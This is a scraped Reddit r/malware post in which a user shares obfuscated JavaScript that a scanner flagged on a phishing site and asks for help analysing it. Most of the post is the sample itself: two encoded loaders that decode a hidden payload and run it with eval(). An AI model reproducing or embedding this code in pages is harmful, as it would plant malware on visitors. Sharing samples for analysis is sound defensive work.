{
    "op": {
        "upvote_ratio": null,
        "selftext": "We received a very obvious phishing email and in my researching, the website scanner Sucuri.net reported that it has javascript malware. It also proceeded to supply the malicious code. It's obviously been obfuscated quite a bit by the creator. I was going to attempt to see what hiding behind the veil but I thought I'd throw it out to the community to see what you can come up with. \n\nObviously, you don't want to just blindly execute the code. I have no idea what it does. \n\nvar l1I='==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'; \nfunction _1lO(data){var OIllOI=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; \nvar o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc=''; \ndo{h1=OIllOI.indexOf(data.charAt(i++)); \nh2=OIllOI.indexOf(data.charAt(i++)); \nh3=OIllOI.indexOf(data.charAt(i++)); \nh4=OIllOI.indexOf(data.charAt(i++)); \nbits=h1&lt;&lt;18|h2&lt;&lt;12|h3&lt;&lt;6|h4; \no1=bits&gt;&gt;16&amp;0xff; \no2=bits&gt;&gt;8&amp;0xff; \no3=bits&amp;0xff; \nif(h3==64){enc+=String.fromCharCode(o1)}else if(h4==64){enc+=String.fromCharCode(o1,o2)}else{enc+=String.fromCharCode(o1,o2,o3)}}while(i&lt;data.length); \nreturn enc} function OIl(string){ var ret = '', i = 0; \n\tfor ( i = string.length-1; \n i &gt;= 0; \n i-- ){ ret += string.charAt(i); \n} return ret; \n }eval(_1lO(OIl(l1I))); \n        &lt;/script&gt;\n\t\t\n\t\t\n\t\t\nvar _0lO='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'; \nfunction IOI(data){var O1IlOI=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; \nvar o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc=''; \ndo{h1=O1IlOI.indexOf(data.charAt(i++)); \nh2=O1IlOI.indexOf(data.charAt(i++)); \nh3=O1IlOI.indexOf(data.charAt(i++)); \nh4=O1IlOI.indexOf(data.charAt(i++)); \nbits=h1&lt;&lt;18|h2&lt;&lt;12|h3&lt;&lt;6|h4; \no1=bits&gt;&gt;16&amp;0xff; \no2=bits&gt;&gt;8&amp;0xff; \no3=bits&amp;0xff; \nif(h3==64){enc+=String.fromCharCode(o1)}else if(h4==64){enc+=String.fromCharCode(o1,o2)}else{enc+=String.fromCharCode(o1,o2,o3)}}while(i&lt;data.length); \nreturn enc} function O1I(string){ var ret = '', i = 0; \n\tfor ( i = string.length-1; \n i &gt;= 0; \n i-- ){ ret += string.charAt(i); \n} return ret; \n }eval(IOI(O1I(_0lO))); \n        &lt;/script&gt;",
        "title": "iFrame Malware",
        "score": 6,
        "id": "40mjox",
        "commsNum": 4,
        "timeStamp": "2016/01/12-06:05:27",
        "author_name": "n8security",
        "is_self": true,
        "locked": false,
        "num_comments": 4,
        "over_18": false,
        "spoiler": null,
        "subreddit": "malware",
        "stickied": false,
        "url": "https://www.reddit.com/r/Malware/comments/40mjox/iframe_malware/"
    },
    "posts": {}
}